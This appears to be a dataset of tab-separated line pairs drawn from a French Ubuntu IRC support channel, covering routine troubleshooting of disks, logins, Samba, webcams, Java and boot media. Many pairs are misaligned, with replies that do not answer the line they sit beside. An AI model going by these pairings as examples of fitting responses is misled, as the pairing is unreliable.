j'ai pas fait grand chose merci a avelldiroll pour la soluce	faux, c'est facile d'arriver, backloguer une discussion, realiser qu'on connait la solution et la donner … faire parler quelqu'un pour qu'il donne des details et precise correctement son probleme, ca prend beaucoup plus de temps et c'est tout aussi indispensable à la resolution des problemes
c'est ce que je pensais	bein même pas, je viens d'update
j'ai des icones en haut à droite  au login, avec LXDE, openbox, lubuntu, lubuntu-netbook	rien de grave concernant le résultat de ma commande, c'est surement la date de ton dernier update
zut j'ai perdu l'historique	t'as reboot ?
par contre il faudra toujours aller selectionner "lubuntu" au login a la place d'openbox	je pense que c'est ca qui mangue
c'est quoi openbox ?	un DE
 hello	bonsoir
Knowledge is only valid if it is shared :)	j'y suis là ... deux bug commenté et là je fais l'ajout de l'outil dans winehq appDB
ça a toujours été compliqué, même sous Windows	certes mais ca fonctionne sous Win 7
et comme j'ai dit je ce même problème sur kiwix	donc ?
cependant j'ai entendu dire que KDE bossait sur un projet nommé Simon	tu parles avec quelqu'un qui est parti :)
bon, j'ai plus qu'à fermer tous les onglets un par un et voir ...	sinon avec l'outils: Plus d'outils/ gestionnaire des taches ?
je vérifie ..., mais je crois pas	pour moi c'est marqué en bas du menu
bon, les accès disque ont repris avec la restauration de ma session Chromium, des idées pour trouver le site internet qui fait ça ?	connecté sous un compte google ? gmail ? google + ?
ouai, j'ai restauré ma session Chrome, pas vraiment plus d'accès disque,  je relance Chromium ...	essaie plutôt de changer de navigateur :)
bon, ça c'est bien calmé quand même, il reste quelques accès disque, mais c'est raisonable	c'était juste pour signifier les applications web gourmandes, y'en a d'autres
ah, chromium...	pas bon Chromium ?
pas bon Chromium ?	des expériences que j'ai eu, le local storage est beaucoup sollicité (notamment avec des machins super gourmands comme gmal)
sinon faut verifier si y a pas des logs qui auraient raté une rotation	là, je saisi pas ce que tu veux dire ?
euh, je vois pas le rapport avec la choucroute, atop c'est un detail du load, le disque c'est de I/O uniquemnt … va voir ce que toussent iotop	iotop -a montre que jbd2 et collé en tête de liste
mais j'ai déjà stoppé tous les process Chromium sans pour autant que le bruit s'arrête	t'as coupé chromium là ?
nan, ça swap pas, c'est autre chose, accès disque "petit volume", mais permanent, ne ralenti pas la machine	et atop ?
et atop ?	atop done Chromium en tête, mais je ne sais pas s'il montre les processus kernel ?
et la machine est à jour	et ton pourcentage de swap ?
et ton pourcentage de swap ?	swap = 356Ko / 0%
des accès disques permanents, je ne sais comment diagnostiquer le problème ?, des idées ?	essaie atop, ou iotop
essaie atop, ou iotop	swap à 356Ko
bonjour toutes et tous,	ça dépend de ce que tu fais, de ta machine, etc.
…	ha ... bonne question ... pas sûr ...
parce qu'avec tous le réseau de cable, on est pas sûr à 100 0'avoir branché le bon…	assure toi de ça, oui
!paste	visiblement tu es déjà connecté en wifi
mnt c'est une nouvelle bbox	t'es connecté en wifi là hein
et je n'ai pas essayé avec une session live non, j'en ai pas sous la main	c'est arrivé d'un coup ? ou ça n'a jamais marché ?
patientes _N0mad_	moui, je me suis trainé un disque avec 600k loadcycles pendant près de 5 ans
moui, je me suis trainé un disque avec 600k loadcycles pendant près de 5 ans	le fait d'avoir un gros taux de loadcycle, est ce un bon signe :), ça peut mener à la panne non ?
Donc Dell va essayer de trouver une solution en sortant un nouveau bios sur la serie Inspiron 15 Ubuntu Edition :)	sincerement, peux tu avoir un autre pseudonyme ?
j'aime bien ce troll là, beaver :D	<3
ah	tres aigu
http://www.asciitable.com/	c'est pour faire quels caractères ?
N'y a t il pas de redirection de ports ou autre a faire?	logiquement, si
bon la commande "initrd" lui est inconnue ....	le support de mint c'est pas ici, leur salon officiel est sur un autre server que freenode
#ubuntu-fr-testing	Mint n'apparait pas
je n'ai pas encore le clavier français ; comment taper une "(" ????	si tu regardes le topic du canal, tu vois quoi, Ubuntu =! Linux Mint :(
Beaver puisque que tu es là: moi c'est résolu ma console avec des carractères étranges. J'ai nettoyé les locales: rien, j'ai changé de pilote nvidia et reboot: nickel :) Et j'ai récupéré de la vitesse	wouah, super alors :)
mais si tu veux le côté synthétique, en général ça sent mauvais quand tu vois ça	j'ai tapé "ls" au message du grub rescue ; il me répond :
ça fonctionne pas à 100%	hi hi ... c'est un pb DNS pour les applis wine 32
^_^	ou bien tu peux écrire à ton concessionnaire qui te l'a vendu
ou bien tu peux écrire à ton concessionnaire qui te l'a vendu	oui ... dès que je serai connecté ^_^ juste un problème de com visiblement... pas de raison que wine ne sache gérer ça ... il détecte bien la cles initialisé par le gps
le Pb du GPS c'est qu'il y a une voiture construite dessus ... en fait	pareil
bonsoir	j'essaye le wininet justement
♫♬♩♫♪ rare, mais possible	pas grave ... j'ai vu qu'il y avait déjà un hack
tu as 31 jours d'essais	Na ... c'est une clé USB qui fait la navette
ben une petite machine virtuelle ça sera moins casse gueule je pense	mouaip mais c'est moins drôle et j'ai pas de licence windose ^_^
http://doc.ubuntu-fr.org/_media/personnalisation/look_win7_cinnamon.png?cache= pfouah !	y'a cortana ?
bonjour	je vient de reboot a cause un gros freeze
D'accord merci. C'est encore nouveau pour moi tout ca. Je me pencherais là dessus demain du coup. Bonne journée	ils sont sur irc.spotchat.org … http://community.linuxmint.com/ (onglet community -> chatroom pour un webclient vers leur irc anglophone, je n'ai aucune idée si ils ont un francophone
Je connais peu linux, tu as la commande ? :/	le support de mint c'est pas ici, leur salon officiel est sur un autre server que freenode
Je connais mal mint mais on vas tester si tu met a jour vias ton terminal il se passe quoi ?	et je n'ai pas de grub au demarrage de ubuntu
pour le dual boot tu a un outil a installer rEFInd qui te premetras de choisir ton os ;)	2 petites remarques, la partition apparait comme "Windows" a cote de Macintosh lors du choix
mais de rien	la touche Option ne me deplaie pas, et j'avais teste rEFInd, le install.sh plantait
ghigt alors ca donne quoi ?	everything's working great! Merci
normalement non tu boot sur grub direct	ok, je teste tout ca et je reviens
shobu13 un souci de ddl je dirais look par la http://en.touhouwiki.net/wiki/Running_in_Linux_and_Mac_OS_X	pour booter dessus, j'ai juste a rester appuyer sur Option et choisir l'autre partition ?
ok tient moi au jus	installation terminee
ghigt tout ce passe comme tu veut ?	je te remercie en tout cas de ton aide
ok je checke ca	pour l'instant l'install se passe comme d'habitude, on arrive au GRUB dans pas longtemps
non essaye d'intaller comme ca	rien n'est selectionner donc si je fais suivant, que va-t-il faire ?
Shobu13 il faut que tu soit dans le repertoire du programe	ca me donne ca : https://framapic.org/iXdYSNW1MUEx/ZSiD0tpX
mais tu choisi autre chose	autre chose ?
oui	je reboot ?
si tu le lance depuis un terminal il se passe quoi ?	mais c'est pas dangereux de supprimer cette partition la ?
!wiki locale	http://doc.ubuntu-fr.org/localepurge | http://doc.ubuntu-fr.org/firefox | http://doc.ubuntu-fr.org/edubuntu_ltsp_configuration | http://doc.ubuntu-fr.org/partage | http://doc.ubuntu-fr.org/scite
comment j'ai pu rajouter le "ou" ?	tu lis ce que j'écris ? :)
quand tu lances un process a un endroit, ca continue ?	ben oui ... si tu es sous odroid sur /truc/bidule
stat -c 'Owner: 0 / Access_rights: %A / Last_access 0' /home/odroid  aussi non ?	heu "/home/odroid" ?
ok	c'est quoi ton id ?
read only ?	tape
Sinon, je tente de réparer mon pc actuel et je l'utilise a la place	si tu veux "du cle en main", tu pioches dans la liste que je t'ai collé
donc tu as essayé avec quels session ?	oui c'était mon côté non sectaire, je l'utilise pas non plus cet OS
mais il ne ping rien	il faudrait ping une ip pour voir :)
comment installer un programme téléchargé sur le web pour linux	il a quel format ?
C'est dans les options d'allimentation de Windows 8, si tu est sous ubuntu la, redémarre sous windows 8	ok, et concernant ton probleme ?
Oui, effectivement	le hic il est là
nn mais attend flutterbrony, as-tu des notions en bash? (ls pwd cat grep...)	tu veux grep quoi dans les logs ? tu as pas le modele
je cherche comment vous l'envoyer, beaucoup de truc dedans, je sais pas si le mettre avec paste.ubuntu-fr-secours, ca seras bien lisible	et quand même, tu dois bien savoir si tu as branché une clé wifi en usb ou pas sur ta becanne nope ?
oui non ?	je crois qu'il en beave
au fait, j'aime ton pseudo flutterbrony :D	je tape "/r/coolgithubprojects" tel quel?
je tape "/r/coolgithubprojects" tel quel?	non
merci, bref, j'ai peur d'avoir peu d'hadésion, j'aimerais rester en C et X11 à l'ancienne...	si ton projet est original tu auras des retours, dans le cas contraire, tu vas finir au fond du forum
https://forum.ubuntu-fr.org/viewforum.php?id=69 djt	tu m'a envoyé vers un forum?
tu m'a envoyé vers un forum?	il semblerait
Bonsoir au passage	quand tu crées un dépôt sur GitHub, ça t'explique tout...
GitHub plutôt...	?
même pour les projets libres?	tu peux essayer via launchpad
non c'est pas bon	te suffit de màj bind via apt-get update ? le correctif est dans les dépots
Bon, personne n'as de piste ?	comment tu as installé ubuntu ?
une ligne bash ou une commande vim, au choix, enfin, tu fais ce que tu veux	ça fonctionne pas même via le fichier hosts.deny
mais personne n'utilise ce fichier depuis 20 ans ....	j'ai un fichier .txt avec une très grosse liste d'ip à bannir
..	non elle est deja upgrade :)
non elle est deja upgrade :)	han, toi sous Ubuntu ?
je ne faisais quue checker l'environnement	il tourne en prod dessus ?
une commande ?	tu es connecté présentement ?
merci quand même cemoi	pour retrouver un fichier dans un paquet non installé, apt-file est utile
mais t'as eu la reponse à cette question je n'ai fait qu'ajouter des infos complémentaires pour pouvoir affiner/allé un peu plus loin	ceci étant dit, je trouve les dongle assez cool comme techno, et comme ça fonctionne "out of the box" sous windows et mac os x, pas de raison que nous ne l'ayons pas sur notre bel OS
l'avantage n°1 c'est que popco*rntime avec sous-titres ça fonctionne, l'avance rapide dans n'importe quelle vidéo ça fonctionne etc.	cool ton lien :) perso j'ai direct cablé lep c sur la tv
vive weechat	il faut aimer :þ
yep !	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Yep ! histoire de fou	c'est quoi le probleme ?
Nop nW44b toujours pas ...	t'es sur que t'es dans le bon fichier ?
Quelqu'un l'a déjà fait ?	c'est la ligne Port dans le /etc/ssh/sshd_config
mais ce qu'expliquait Marmotte justement c'est qu'il ne veut pas réinstaller pour ne pas se retrouver avec des tonnes de packages dont il ne veut pas, et qu'il préfère donc faire une mise à jour	et merci pour le lien, je ne connaissais pas Rygel (même si ça ne me servira pas, c'est toujours utile à connaître :D)
et merci pour le lien, je ne connaissais pas Rygel (même si ça ne me servira pas, c'est toujours utile à connaître :D)	Rygel basiquement c'est un serveur DLNA/UPNP pour tes propres fichiers, ça permet de se passer d'un player dédié
Rygel basiquement c'est un serveur DLNA/UPNP pour tes propres fichiers, ça permet de se passer d'un player dédié	oui, mais j'ai déjà minidlna comme serveur, qui me convient parfaitement :)
http://paste.ubuntu-fr-secours.org/src-147576 <= quelqu'un peut m'expliquer ces changement de fréquences du wifi ? il viens de planté sans aucun raison apparente...	tu as écrasé un chat noir dernièrement ? lspci | grep wlan
y'a encore du monde devant leurs ordi ??	toujours
et ça dit quoi dans la log à ce moment là ?	je vais aller faire un tour sur #freecad
d'ailleurs ce bug me parait bien bizarre	piste le moment ou ça coince avec dmesg et /var/log/Xorg.log
je comprend pas ce qui se passe	journalctl -p4   ça donne quoi ?
ben ça fait plus de 15 min... je me lève juste	si c'est via update-manager et que les dépôts sont non modifiés c'est normal
 compress file data during the transfer	voilà mais juste pendant pas apres
on peut même compresser d'apres ce que je vois, c'est dingue	 tu compresses le flux, pas les fichiers stockés
on peut déplacer les fichiers supprimés par contre	--remove-source-file
oui	pas trouvé dans le man pour toucher à la source en regardant de biais)
rsync c'est un cp et mv amélioré	ha oui on peut l'utiliser aussi à la place de mv :) par contre j'utilise quasi plus cp/scp
c'est de la recherche pure que tu fais ? ^_^	si je peux eviter ...
si j'étais certain que cela n'existe pas je me lancerai dans un petit dev	sinon autant aller à là source : https://bugs.launchpad.net/ubuntu/+source/samba
sinon autant aller à là source : https://bugs.launchpad.net/ubuntu/+source/samba	je vais prendre peur alors je prefere pas regarder lol
je vais prendre peur alors je prefere pas regarder lol	en tout cas ya du suivi sur les bugs ... plutôt positif
en tout cas ya du suivi sur les bugs ... plutôt positif	c'est vrai :)
un ad "prêt à l'emploi", c'est pas une tâche aisée :)	j'ai pas trouver d'info sur le wiki Samba concernant l'étendue des GPO
je dirais: https://doc.ubuntu-fr.org/samba-active-directory	merci :) on a accès à toutes le GPO ?
Trop de chose à lire en ce moment ... je vois pö	oui
c'est juste une pour une association avec 5 PC donc bon ... mais par contre ca reste de la prod	DC pour Domain Controler ?
avez-vous déjà mis Samba 4 en rpod ?	en tant que DC ?
en tant que DC ?	oui pardon en prod en tant de DC principal
et il y'a aussi Gparted	partition magic vs parted magic ... fatigue
hihi ça appartiendrai à Norton : https://linuxfr.org/news/gparted-livecd-vs-parted-magic	lis mieux
ah bein oui c'est payant :)	c'est vrai ... c'est vrai ...
$9	sur la page ubuntu ?
(je vous laisse, vous avez l'air débloqué ^^)	ça pour avoir débloqué ça a débloqué à plein tube
t'as un bureau, t'as tout ce que contient un systeme d'exploitation	bha oui on dirait bien ya même du conky
parted magic a free partioning tool that the name	et ça te permet de lancer un browser internet ?
sans savoir ce que tu utilises, on aura du mal à t'aider	y a un live iso qui lance un bureau epuré avec gparted qui s'appelait gparted
y a un live iso qui lance un bureau epuré avec gparted qui s'appelait gparted	parce que ça n'a pas l'air clair, justement ^^
ca copie betement sans se poser de question, bit à bit, une source vers une destination … et ca peut copier un iso sur un device	on est certains qu'il utilise ça ?
installler sur une clef ça booote sur la ram j'avais un probleme de disque dur j	oublie la clé et raconte nous ce qu'il y a sur l'écran ou tu tapes tes messages
^_^  4th dimension begin here	un clavier et un écran, pourquoi ? :D
gratuit je l'ai téléchargé	Que vois tu ? devant tes yeux ?
oui c'est une spece d'os mais limité	es-tu bien sur la planête terre déjà ?
non	tu ne sais peut être pas ce que tu utilises, ou comment ça fonctionne, mais tu utilises un OS, même si tu dis le contraire :D
je n'ai pas d'os je vous jure je galère	tu as téléchargé/installé/démarré/autre ce qui te sert à utiliser le PC comment/où ? ^^
je suis la page internet j'ai pas de client	comment as-tu démarré ton PC ?
beaver ça m'attriste là , avec le truc sous lequel je tourne je ne puis donc pas faire de clef boootable	mais là tu es sous quel os pour nous parler ?
qu'est ce que le terme volatile ?, bein … "temporaire"	insoluble. insolvable, c'est quand on peut pas te faire confiance financièrement
nein ich hane nicht beaver mais j'ai des ports usb	donc, tu es sur livecd la ?
si je disposais d'un pc sous windows ça irait là j'ai pas sous la main	comment préparer ta clé usb si t'as pas d'o/s en dur ?
mais laquelle,	commence par verifier la md5sum de tes isos, et à les retelecharger tant que tu n'as pas un iso potable
rebonjour me revoilà je vais détailller mon probleme, en fait les isos dont je dispose dans mons disques dur externe semblent corrrompus et ne fonctionnnent à savoir que je réalise une clef boootable avec le unetbbotin qui est installler avec gparted, je souhaite trouver une solution avec une autre alternative mais laquellle, pour boooter mon ordi	unetbootin, ca va faire un moment que ce n'est plus la solution recommandée pour creer des liveUSB
La solution serait donc plutôt de passer à un CPU plus puissant.	dans un premier temps, au lieu de se jeter sur une solution, autant prendre le temps de comprendre le probleme
Ok donc c'était uene question  bête. Mais l'explication a été claire :).	tout dépend du problème
En même temps, je viens de voir que sur les 4go de dispo sur le serveur, j'en ai 3 d'utiliser en permanence.	c'est quoi l'extérieur ?
Bonjour tout le monde, j'aimerais savoir si il est possible de forcer une application d'utiliser la ram plutôt que le processeur.	hum … pour faire une analogie bancale, tu demandes si pour faire un trajet en voiture, peut on utiliser le moteur à la place des sièges
sachant que j'ai aussi le souci avec X-org	Xorg, c'est le serveur graphique. Quelque soit le pilote, c'est xorg qui gère la suite
Sachant que j'ai une Nvidia 9500GT et que j'ai installé les drivers	le démarrage fonctionne ?
Est-ce que quelqu'un serait disponible pour repondre à une question s'il vous plait?	pose ta question. On est comme ça sur irc: direct
avec gimp, quelqu'un sait comment on fait des forme du type carré etc  ???	avec la technique proposée: pour faire un carré, choisir "fixed aspect ratio" avec 1:1 dedans. Et si tu veux juste le contour: selection:contour (tu choisis la largeur), puis tu peux remplir la selection avec la couleur que tu veux
qui pour me dire ce que c'est xubuntu-restricted-extras ?	c'est des paquet proprio je crois... en tous cas c'est pour le multimédia
et en fait ça me parait pas si mal	ben c'est un peut limite comme fonction...
ben j'ai rien de lancé, je suis juste sur le bureau et quand je tape au clavier, un petit fenêtre s'ouvre en bas à droit avec les lettre tapés.	je pense que ça ne recherche rien
la fenêtre qui s'active en bas à droite...	comment tu fais pour l'ouvrir déjà ?
alors ?	semblerait que OBS demande une version OPENGL  de 3.2 minimum
quelqu'un pourrait m'aider ?	que donne : glxinfo | grep "version"
je vais tester merci :)	comment c'est, le futur, alors ?
j'ai un problème pour ouvrir open broadcaster softare	si c'est juste pour enregistrer des vidéos, essaie SimpleScreenRecorder ^^
Sauf que ce n'est pas une clé, c'est un téléphone ^^'	toi tu peux essayer de regarder si tu as des ligne qui se rajoutent à dmesg | tail
Avant mon système le détectait, mais depuis un moment ce n'est plus le cas	peut-être tu devrais (après sauvegarde) reformater la clef ?
c'est le même pc sous w$ ?	non
je précise que ça marchait très bien jusqu'à la semaine dernière et que je n'ai pas fait de mise à jour depuis	tu as essayé sur un autre ordinateur ?
tu as essayé sur un autre ordinateur ?	j'ai le même problème sur mon portable sous windows
comment je peux savoir l'utilisation mémoire et cpu de l'ensemble des services ?	avec le moniteur système
c'est quoi la différence ?	juste les services, ou tous les processus ?
il est sous quoi ?	essaye "initctl list"
et vue que j'ai pas de quoi les renouveler et je pense pas avant longtemps il me faut trouver des moyens //	c'est le programme lancé par le noyau afin de lancer tous les autres programmes (l'init)
ubuntu est une bonne distrib mais elle est un peut gourmande vis à vis de mes machine qui ne rajeunisse pas	https://doc.ubuntu-fr.org/upstart
ben ce qui n'est pas vraiment essentiel	tu devrais regarder du coté des deamon à mon avis selon ton utilisation, certain ne te sont pas utiles
c'est possible de supprimer le superflu d''une 14.04 LTS ?	qu'appelles tu "le superflu"
oups, pardon piti j'ai mal recopié	rsync semble plus adapté là
hum... il semble s'arrêter au niveau supérieur... comment le faire chercher dans les dossiers ? (cp -R .mp3 /source /destination ne fonctionne pas...)	lis ce que je viens de te mettre
sur libreoffice writter, quelqu'un sait comment modifier l'interligne sur tout le document ?	f11-> clic droit modify (sur l'élément racine des styles), onglet "indents & spacing", "Line Spacing", et tu choisis l'interligne que tu souhaites
Bonjour, ça fait quelque jours que j'ai un bug dans mes mises à jour, je ne sais pas comment le régler, quelqu'un pourrait m'aider s'il vous plaît ? => http://pastebin.com/BuJFTSDB	supprime la merge list ?
mon clavier est bien en français mais pas le texte. exemple quand j'essais d'installer un logiciel que j'ai deja, ça me marque "this software is already the newest version"	dpkg-reconfigure locales
cette manie de vouloir des détails	ma boule de cristal est en panne :(
ok xD	ben tu devines pas ? :)
je n'ai pas la liste	que te raconte : mdadm --detail --scan
qq un pour m'aider svp ?	on pourrait avoir une description un peu plus précise que "j'ai un souci, il ne fonctionne plus" ? :)
afk	oui et tu pourrais créer ton clavier sans barre d'espace  non ?
je,l'utilise,de,temps,a,autre	à pardon ok ... faut acheter un clavier là
noyer,et,marmott,devais,m'expliquer,comment,mapper,une,autre,touch	et là ? pourquoi ces virgules ?
nop	tu utilises le clavier virtuel ?
est-ce que cela aiderai à résoudre mon problème : au moment d'entrer mon MdP pour me connecter sur ma session, si je choisi openbox au lieu de lubuntu, j'arrive sur un écran noir	que dit ton /var/log/lightdm/litghtdm.log ?
il,'aime,pas,qu'on;le,force,reboot	 pas cool ce rename.ul il ne permet pas de préserver un fichier existant
enfaite (faudrai que je pense a actualisé mes alias)	 for i in *.doc; do echo F${i#Facture#}; done
Bonjour, quelqu'un aurais t'il une commande pour renomer une serie de documents (pdf et doc) pour faire simple j'aimerais changer Facture#01.1xx.PDF,en F01.1xx.pdf,D'avance Merci (je ne trouve que des doc en anglais qui ne semble pas faire se que je veux	avec Thunar (sous Xfce) c'est facile, tu sélectionnes plusieurs fichiers et tu fais Chercher / Remplacer
!paste	pas d'idée là je dois m'absenter
pas d'idée là je dois m'absenter	ok, de plus que ls /dev/ | grep video
Mmh, ne fonctionne toujours pas, dois-je reboot?	en rebootant toujours pas ?
non ?	je tente d'update le driver du coup -> http://linuxtv.org/wiki/index.php/Libv4l_Upside_Down_Webcams
!paste	tu as du son ?
journalctl pardon	je te c/p ca
mvvv: video0	tu as quoi comme message quand tu lance depuis guvcview ?
en fait non, meme pas..	pour les webcam externes
lscpi*	oui
pourquoi avoir compilé un driver ? c'est un modèle exotique de webcam ?	tu as besoins de mon lsmod + lscpi?
Et j'obtiens "Une erreur est survenue pendant la lecture de la vidéo de la webcam" á l'ouverture de Cheese. (auparavant j'obtenais aucun périphérique video, ca semble en bonne voie, mais la, je bloque)	et avec guvcview ?
et avec guvcview ?	j'ai testé dans le navigateur sur http://appear.in, maintenant je vois la lumiere bleu de la webcam qui s'allume puis qui s'éteind immediatement.
Et quel serait le bon endroit ? car je cherche dans le vide depuis un moment	tu te rends compte que c'est *pas toi* qui fait tourner gmal ?
Je pose le http://pastebin.com/eLpV7SN5 ici au cas ou.	pas sur que ça soit le bon endroit, mais dans le doute: ton système peut émettre des mails ?
Bonjour, je cherche a désactiver un compte. comment faire. merci	un compte système ?
un compte système ?	oui, un compte systeme/
vraiment bizarre	ls -a ? ya pas le compte des 300Go
je cherche sur internet mais je ne trouve rien.	Quel système de fichier ? ext4 ? FAT16 ?
A quoi correspond l'état defunc?	 quelque chose comme : X_x
merci	lis les manpages, mais tu devrais pouvoir t en sortir avec un des deux
lis les manpages, mais tu devrais pouvoir t en sortir avec un des deux	oui, je me souvenais plus du nom de commande!
Sur un serveur?	lsof ou fuser
Bonjour j'ai un soucis pour rediriger mon nom de domaine de 1and1 vers lautre net, quelqu'un peut m'aider ? Merci :)	pas sur que ça soit le bon endroit pour ça :/
autre question : comment savoir ou a été installé un binaire ?	tu peux faire dpkg -L nomdupaquet
'fin bref, maitenant si je fait apt-get il me dit que le paquet existe déjà	faut supprimer le dezip je pense
faut supprimer le dezip je pense	je tente un apt-get autoremove
je tente un apt-get autoremove	non il faut enlever ce que le ZIP a apporté ... ceci dit toujours bon de faire un autoremove
<--- stupid	c'est un réflexe à prendre: si c'est dans les dépots, c'est des soucis en moins
c'est un réflexe à prendre: si c'est dans les dépots, c'est des soucis en moins	tu as raison ! ca me servira de leçon
j'ai dl le zip depuis http://sourceforge.net/projects/atomicparsley/files/atomicparsley/AtomicParsley%20v0.9.0/	pourquoi pas par les dépôts ubuntu ?
est-ce que quelqu'un pourrait m'aider pour installer AtomicParsley (pour tagger des mp4) ?	laquelle ?
sudo apt-get install atomicparsley	ça c'est déjà fait ; seulement lorsque je lance la commande il m'annonce qu'il ne trouve pas une librairie
Gnome je l'ai mis ce matin après avoir vu que ça marchait pas, pour tester. Je ne pense pas que ça vienne de lui. Openbox...ça me paraitrait étrange. Du coup il ne reste que lxde	au cas ou regarde dpkg.log ... peut être une mise à jour
Ouaip, mais alors d'où est-ce que ça peut venir... Peut-être un fichier mal écrit qui me relance lightdm?	parmi tes 3 bureaux il y a un vilain qui casse lightdm il apparait sans doute durant une mise à jour depuis vendredi matin
La doc fait 3 milliards de page, j'ai pastrop le temps de tout lire	si ta clé ne contient rien d'autre, tu peux juste écrire l'image sur la clé (avec cat ou dd, pas cp :D)
si ta clé ne contient rien d'autre, tu peux juste écrire l'image sur la clé (avec cat ou dd, pas cp :D)	okay :o
Il faut maintenant que je trouve un moyen de le lancer par défaut, sans passer par lightdm...	c'est que ça ne vient pas de X ni de ta session, du coup
pour voir si ça fait pareil	ta méthode avec xinit a fonctionnée
dans le log j'ai un "CRITICAL: session_get_login1_session_id: assertion 'session != NULL' failed"	au fait c'est pour ce loguer sous quoi ? XFCE ? Unity ?
En gros je suis coincé sur l'écran de connexion	sinon il y a bien un lightdm.log sous /var/log qui peut être intéressant
sinon il y a bien un lightdm.log sous /var/log qui peut être intéressant	ni l'un ni l'autre, c'est mon pc de boulot et vendredi en partant tout fonctionnait correctement. Là je reviens et il ne se connecte plus. j'ai déjà eu ce problème ya une semaine et j'ai réinstallé
Bonjour. J'ai un petit souci sur lubuntu 15.04. Dans lightdm (ou gdm), lorsque je me connecte sur ma session l'écran devient noir une seconde puis je retourne sur lightdm. Quelqu'un aurait une idée d'ou le problème pourrait venir? :/	c'est suite à l'ugrade vers 15.04 ? ou suite à une bidouille ?
tu devrais y trouver des indices	.xsession-errors est vide, et Xorg.0.log ne m'affiche aucun message d'erreur flagrant.
ou le /var/log/Xorg.0.log	je regarde ça
pour voir si sa marche	si tu as la même erreur ça confortera le verdict
je pense que c'est ça mon problème	j'en reste à la solution plus haut, si c'est le serveur qui gère la sécurité pour tout le domaine
http://pastebin.com/WeX8tRzU	tu dois avoir plus après non ?
c'est un joli echec	un message d'erreur ?
 2909  2512  0 10:55 pts/0    00:00:00 grep --color=auto nmdb	le ping marche avec les noms de serveurs ou juste l'adresse IP ?
Ouai bon idem	 ps -ef | grep nmdb
Et je n'ai plus réussi à me connecter au même moment que je ne voyais plus les ordinateurs	as-tu une erreur quand tu les scrutes ? smblient -L servername ?
as-tu une erreur quand tu les scrutes ? smblient -L servername ?	idem nonem
(des fois qu'une mise à jour ait modifié quelque chose...)	bah y avait pas grand chose à parametrer
Le pire c'est qu'il detecte le NAS qui est HS ><	ça confirme que c'est bien le lanmanServer qui pose problème
Je pense que le principal problème est que je ne vois plus les autres ordinateurs sur le réseaux	la mauvaise c'est qu'il faut vérifier sur le serveur windows si il y a un Event 2017 dans son journal et de modifier sa configuration
re	la bonne nouvelle : http://www.dedoimedo.com/computers/windows-7-samba-errnomem.html
ça devait sans doute marcher	sinon as tu essayé smclient en ligne de commande ?
Vide	ben je cale là ... trop longtemps que j'ai pas bidouillé samba et je suis plus à jour
Il est ... vide	no prob c'est surtout le serveur samba qui l'utilise
Et l'erreur est : Connexion terminée par expiration du délai d'attente	ça serait pas du samba des fois ?
ça serait pas du samba des fois ?	si c'est du samba
si c'est du samba	un mot de passe n'aurait-il pas été changé sur le serveur windows ?
un mot de passe n'aurait-il pas été changé sur le serveur windows ?	j'ai un nouveau username et mpd valide
j'ai un nouveau username et mpd valide	donc en faisant une connexion au serveur à partir de nautilus (lanceur "Fichiers") ?
sur irssi, c'est "/set dcc_autoresume on", par exemple :)	yep 14.04 je ne retiens pas ce genre de choses par coeur ^^
DCC est sur la page de xchat mais donc valable pour tous clients, l'autre commande c'est /set completion_amount 0	la commande "/set dcc_auto_resume on" est probablement spécifique à xchat
Et "problème sur la complétion" c'est quoi?	si tu parles de la commande qui est dans la doc, elle n'est valable probablement que pour xchat
ya mieux que xchat ? pidgin ?	si, "partage windows", c'est du samba :)
Les autres machines sur Win 7 y arrivent Marmotte , je suis sous Ubuntu 14.4 (normalement). J'essaie via les commandes mount et le gestionaire de fichiers onglet parcourir et connexion	14.04, pas 14.4 :)
Tant qu'on y est  c'est quoi auto-resume des transferts DCC interrompus?	DCC = transfert de fichiers directement d'un client IRC vers un autre
Bonjour je n'arrive plus à accéder a un partage windows 7 sur ubuntu, une idée de la raison?	tu essaies d'y accéder comment ? y arrives-tu par d'autres moyens et/ou depuis une autre machine ?
Pourquoi donc les modifier? En plus en sudo!	parce que certains aiment bien tout modifier, probablement
Ah ok, je vais voir ça, mais chez moi il y en a seulement à côté de ChanServ et uBOTu-fr	oui pareil pour moi
Salut, Je suis en train de travailler sur la page xchat de la doc. On y parle de changer les icônes de la liste des utilisateurs, quelqu'un sait de quelle liste il s'agit?	http://xchatdata.net/Using/UserlistStatusIcons
J'ai ce message: 23:42 [evolution] <defunct>	ça veut dire qu'il est mort, mais pas terminé
c'est aberrant que des logiciels nécessitent encore le JDK Oracle en 2015	je n'ai pas écris le code!
Eclipse, c'est super mais je maitrise pas trop, c'est dommage car puissant!	Oracle c'est le mal. :(
ah	pourquoi?
bon, bref, tu devrais avoir plusieurs choix, tu selectionnes ta version java à toi … /usr/lib/jvm/java-6-openjdk-amd64 par exemple, et tu edites le fichier /etc/environment avec pour contenu : JAVA_HOME="YOUR_PATH"	JDK_HOME plutot c'est la seconde variable qu'il recherche après IDEA_JDK_64 et c'est cohérent au fait que c'est une JDK et pas seulement une JVM
Es que cela pose un probléme entre le 32/64 pour la jvm?	oui quand même. n'as-tu pas un fichier idea64.exe dans le répertoire jetbrains
non, je vois pas du tout quoi faire.	ton intellij est 32 ? et tu es sur un système 64 ?
Je sais essaye d'installer java  oracle pour voir	toujours pas réglé ?
http://pastebin.com/W8pqTgmK	visiblement c'est le suffixe amd64 qui lui pose problème
Bonjour, désolé	que dis "update-java-alternatives -l"
j'aimerais savoir comment utiliser un clef usb en mode console svp	Ctrl+Alt+F1
personne ne sait? :/	ouvre un terminal et tape find /usr/share/icons -name "system-devices-panel*"
ça fait depuis hier que je cherche lol	quel environnement de bureau ?
des claviers sans inscriptions sur les touche	Oui, il y en a chez LDLC et Typematrix le fait, mais je prefere quand c'est directement sur le laptop.
Ok, le support dira non ?	ça se vend
sur les ancienne version tu as pas le wifi et le lecteur de carte média si ma mémoire est bonne	le texte n'est pas trop petit à ton gout?
http://doc.ubuntu-fr.org/picasa	oO
JAMAIS	oui c'est bon un peu d'indulgence, ça fait juste des années que je me suis pas connecté à IRC
ben y a les sous titres avec le dlna, enfin ça dépend du format du fichier	explique stp :) car moi ce que je lis c'est que ça transporte juste le flux vidéo et mp3 et que si tu veux du sous-titres faut transcoder la vidéo pour l'incruster dedans avant de l'envoyer
j'ai trouvé mieux que gupnp au fait, c'est eezupnp http://www.eezupnp.de/index.html en java	"en java" et "mieux" dans la même phrase ?
0 non mis à jour, ça veut dire qu'il n'y a pas de paquet pas à jour qui ne sera pas mis à jour	tu étais encore en 12.04 ? O_o
tu étais encore en 12.04 ? O_o	bah pourquoi pas ?
